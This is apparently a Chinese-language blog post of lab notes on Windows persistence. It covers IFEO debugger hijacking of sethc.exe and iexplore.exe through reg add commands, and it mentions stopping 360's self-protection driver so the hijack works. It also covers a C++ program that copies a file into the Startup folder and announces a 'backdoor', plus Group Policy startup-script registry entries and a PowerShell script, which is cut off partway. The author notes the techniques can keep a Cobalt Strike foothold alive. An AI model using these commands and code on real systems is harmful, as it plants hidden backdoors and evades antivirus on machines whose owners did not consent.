<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170920439.webp" alt="image-20240717092022276" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170920439.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170920439.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170920439.webp?size=large 2x" data-title="image-20240717092022276" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="高版本" class="heading-element"><span>高版本</span>
  <a href="#%e9%ab%98%e7%89%88%e6%9c%ac" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>再较高的版本中，我们需要用到IFEO,即映像劫持。</p>
<h3 id="什么是ifeo" class="heading-element"><span>什么是IFEO</span>
  <a href="#%e4%bb%80%e4%b9%88%e6%98%afifeo" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>所谓的IFEO就是<code>Image File Execution Options</code>，直译过来就是映像劫持。它又被称为“重定向劫持”（Redirection Hijack），它和“映像劫持”（Image Hijack，或IFEO Hijack）只是称呼不同，实际上都是一样的技术手段。白话来讲就是做某个操作的时候被拦截下来，干了别的事。</p>
<p><strong>当我们双击运行程序时，系统会查询该IFEO注册表，如果发现存在和该程序名称完全相同的子键，就查询对应子健中包含的“debugger”键值名，如果该参数不为空，系统则会把 Debugger 参数里指定的程序文件名作为用户试图启动的程序执行请求来处理。这样成功执行的是遭到“劫持”的虚假程序</strong></p>
<h3 id="可视化修改" class="heading-element"><span>可视化修改</span>
  <a href="#%e5%8f%af%e8%a7%86%e5%8c%96%e4%bf%ae%e6%94%b9" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>在iexplorer.exe中加入键值对:<code>debugger c:\windows\system32\cmd.exe</code></p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170921646.webp" alt="image-20240717092120385" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170921646.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170921646.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170921646.webp?size=large 2x" data-title="image-20240717092120385" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h3 id="命令行修改" class="heading-element"><span>命令行修改</span>
  <a href="#%e5%91%bd%e4%bb%a4%e8%a1%8c%e4%bf%ae%e6%94%b9" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">reg</span> <span style="color:#58a1dd">add</span> <span style="color:#a6be9d">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe&#34;</span> /<span style="color:#58a1dd">v</span> <span style="color:#a6be9d">&#34;Debugger&#34;</span> /<span style="color:#58a1dd">t</span> <span style="color:#58a1dd">REG_SZ</span> /<span style="color:#58a1dd">d</span> <span style="color:#a6be9d">&#34;c:\windows\system32\cmd.exe&#34;</span> /<span style="color:#58a1dd">f</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">win10</span>：  <span style="color:#58a1dd">reg</span> <span style="color:#58a1dd">add</span> <span style="color:#a6be9d">&#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#34;</span> /<span style="color:#58a1dd">v</span> <span style="color:#58a1dd">Debugger</span> /<span style="color:#58a1dd">t</span> <span style="color:#58a1dd">REG_SZ</span> /<span style="color:#58a1dd">d</span> <span style="color:#a6be9d">&#34;C:\Windows\System32\cmd.exe&#34;</span></span></span></code></pre></div><p>需要管理员权限</p>
<h3 id="实验-" class="heading-element"><span>实验-</span>
  <a href="#%e5%ae%9e%e9%aa%8c-" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>试了半天，注册表是system启动的，但是写不进debugger，原因是启动了360自我保护</p>
<blockquote>
<p>360是有加载了一个名为360SelfProtection.sys的驱动程序。</p>
<p>这个驱动程序负责保护360的产品（防止结束、删除……）其中有一个功能就是禁止写入IFEO的Debugger值。因为这样可以==避免病毒用IFEO来禁止杀软启动==。
停止运行该驱动可解决问题。</p>
</blockquote>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407221419732.webp" alt="image-20240722141908528" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407221419732.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407221419732.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407221419732.webp?size=large 2x" data-title="image-20240722141908528" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>关闭以后就能进行劫持了(但是默认是开启的就不好搞了)，当然，前提条件是有权限对相应注册表进行写操作（测试adminitrator是可以的）。</p>
<p>可以用来维持CS</p>
<h1 id="开机启动项" class="heading-element"><span>开机启动项</span>
  <a href="#%e5%bc%80%e6%9c%ba%e5%90%af%e5%8a%a8%e9%a1%b9" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><h2 id="开始菜单启动项" class="heading-element"><span>开始菜单启动项</span>
  <a href="#%e5%bc%80%e5%a7%8b%e8%8f%9c%e5%8d%95%e5%90%af%e5%8a%a8%e9%a1%b9" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>开始菜单启动项，指示启动文件夹的位置，具体的位置是“开始”菜单中的“所有程序”-“启动”选项：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>[<span style="color:#58a1dd">WIN</span>+<span style="color:#58a1dd">R </span><span style="color:#58a1dd">输入</span>] <span style="color:#58a1dd">shell</span>:<span style="color:#58a1dd">startup</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">C:</span>\<span style="color:#58a1dd">Users</span>\<span style="color:#58a1dd">SD</span>\<span style="color:#58a1dd">AppData</span>\<span style="color:#58a1dd">Roaming</span>\<span style="color:#58a1dd">Microsoft</span>\<span style="color:#58a1dd">Windows</span>\<span style="color:#58a1dd">Start </span><span style="color:#58a1dd">Menu</span>\<span style="color:#58a1dd">Programs</span>\<span style="color:#58a1dd">Startup</span></span></span></code></pre></div><p>相关键值</p>
<pre tabindex="0"><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170923052.webp" alt="image-20240717092304833" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170923052.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170923052.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170923052.webp?size=large 2x" data-title="image-20240717092304833" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>由于每台电脑的快速启动目录不同,可以代码实现</p>
<p>编译好c++文件，然后<code>startup.exe C:\Windows\System32\cmd.exe CMD.exe</code></p>
<pre tabindex="0"><code>#include 
#include 


#include   
#pragma   comment(lib, &#34;shell32.lib&#34;)


BOOL AutoRun_Startup(CHAR* lpszSrcFilePath, CHAR* lpszDestFileName)
{
BOOL ret = false;
CHAR szStartPath[MAX_PATH] = { 0 };
CHAR szDestFilePath[MAX_PATH] = { 0 };
//返回快速启动目录路径到szStartPath
ret = ::SHGetSpecialFolderPathA(NULL, szStartPath,CSIDL_STARTUP,TRUE);
//判断是否获取成功
if (ret == TRUE)
{
printf(&#34;[+]Get the quick start directory successfully！\n&#34;);
}
else
{
printf(&#34;[!]Get the quick start directory faild！\n&#34;);
return FALSE;
}
//构造文件在快速启动目录下的路径
::wsprintfA(szDestFilePath,&#34;%s\\%s&#34;,szStartPath,lpszDestFileName);
//复制文件到快速启动目录下
ret = ::CopyFileA(lpszSrcFilePath, szDestFilePath, FALSE);
if (FALSE == ret)
{
printf(&#34;[!]Failed to save the file in the quick start directory.\n&#34;);
return FALSE;
}
else
{
printf(&#34;[!]Successfully to save the file in the quick start directory.\n&#34;);
}
printf(&#34;[+]Backdoor generation in quick start directory successful!\n&#34;);
return TRUE;
}
int main(int argc, char* argv[])
{
printf(&#34;[*]Useage:\n    %s %s %s\n&#34;, &#34;Run_StartUp.exe&#34;, &#34;E:\\010Editor\\010 Editor\\010Editor.exe&#34;, &#34;010Editor.exe&#34;);
if (argc == 3)
{
AutoRun_Startup(argv[1], argv[2]);
}
else
{
printf(&#34;[!]Please check the number of your parameters\n&#34;);
}
}</code></pre><h3 id="实验" class="heading-element"><span>实验</span>
  <a href="#%e5%ae%9e%e9%aa%8c" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>编译出来exe，然后可以添加开机启动项</p>
<p>貌似是不会拦的？</p>
<p>win+r <code>shell:startup</code>进入开始菜单启动项目录</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407221425861.webp" alt="image-20240722142554644" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407221425861.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407221425861.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407221425861.webp?size=large 2x" data-title="image-20240722142554644" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="组策略" class="heading-element"><span>组策略</span>
  <a href="#%e7%bb%84%e7%ad%96%e7%95%a5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>组策略，运行<code>gpedit.msc</code>，通过组策略的“脚本(启动/关机)”项来说实现。</p>
<p>具体位置在“计算机配置→Windows设置”项下。因为其极具隐蔽性，因此常常被攻击者利用来做服务器后门。</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170923036.webp" alt="image-20240717092353890" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170923036.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170923036.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170923036.webp?size=large 2x" data-title="image-20240717092353890" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h3 id="实验-1" class="heading-element"><span>实验</span>
  <a href="#%e5%ae%9e%e9%aa%8c-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>写一个bat文件，内容为start C:\Windows\System32\cmd.exe</p>
<p>可以直接添加这个bat，也可以添加powershell脚本</p>
<p><a href="https://www.cnblogs.com/osnosn/p/14899171.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/osnosn/p/14899171.html</a></p>
<p>注册表修改</p>
<pre tabindex="0"><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0\0
HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0\0
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\State\Machine\Scripts\Startup\0\0
HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Group Policy\State\Machine\Scripts\Startup\0\0</code></pre><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-reg" data-lang="reg"><span style="display:flex;"><span>Windows Registry Editor Version 5.00
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span><span style="color:#58a1dd">HKEY_LOCAL_MACHINE</span><span style="color:#ff636f">\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\State\Machine\Scripts]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span><span style="color:#58a1dd">HKEY_LOCAL_MACHINE</span><span style="color:#ff636f">\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\State\Machine\Scripts\Startup]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span><span style="color:#58a1dd">HKEY_LOCAL_MACHINE</span><span style="color:#ff636f">\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span><span style="color:#58a1dd">HKEY_LOCAL_MACHINE</span><span style="color:#ff636f">\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\State\Machine\Scripts\Startup\0]</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&#34;GPO-ID&#34;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;LocalGPO&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&#34;SOM-ID&#34;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;Local&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&#34;FileSysPath&#34;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;C:\\Windows\\System32\\GroupPolicy\\Machine&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&#34;DisplayName&#34;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;Local Group Policy&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&#34;GPOName&#34;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;Local Group Policy&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span><span style="color:#58a1dd">HKEY_LOCAL_MACHINE</span><span style="color:#ff636f">\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\State\Machine\Scripts\Startup\0\0]</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&#34;Script&#34;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;C:\\Scripts\\startupEv.bat&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&#34;Parameters&#34;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&#34;ExecTime&#34;</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">hex(b)</span>:<span style="color:#a6be9d">00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span><span style="color:#58a1dd">HKEY_LOCAL_MACHINE</span><span style="color:#ff636f">\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0]</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&#34;GPO-ID&#34;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;LocalGPO&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&#34;SOM-ID&#34;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;Local&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&#34;FileSysPath&#34;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;C:\\Windows\\System32\\GroupPolicy\\Machine&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&#34;DisplayName&#34;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;Local Group Policy&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&#34;GPOName&#34;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;Local Group Policy&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span><span style="color:#58a1dd">HKEY_LOCAL_MACHINE</span><span style="color:#ff636f">\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0\0]</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&#34;Script&#34;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;C:\\Scripts\\startupEv.bat&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&#34;Parameters&#34;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&#34;IsPowershell&#34;</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">dword</span>:<span style="color:#a6be9d">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&#34;ExecTime&#34;</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">hex(b)</span>:<span style="color:#a6be9d">00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00</span></span></span></code></pre></div><p>GPT写了个powershell脚本添加组策略</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#ff636f">param</span> (
</span></span><span style="display:flex;"><span>    [<span style="color:#58a1dd">string</span>]<span style="color:#58a1dd">$scriptPath</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 检查脚本路径是否存在</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> (<span style="color:#ff636f">-Not</span> (<span style="color:#58a1dd">Test-Path</span> <span style="color:#58a1dd">-Path</span> <span style="color:#58a1dd">$scriptPath</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">Write-Host</span> <span style="color:#a6be9d">&#34;Script file does not exist: </span><span style="color:#58a1dd">$scriptPath</span><span style="color:#a6be9d">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">exit</span> <span style="color:#a6be9d">1</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 注册表路径</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$regPath1</span> = <span style="color:#a6be9d">&#34;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\State\Machine\Scripts\Startup\0&#34;</span>
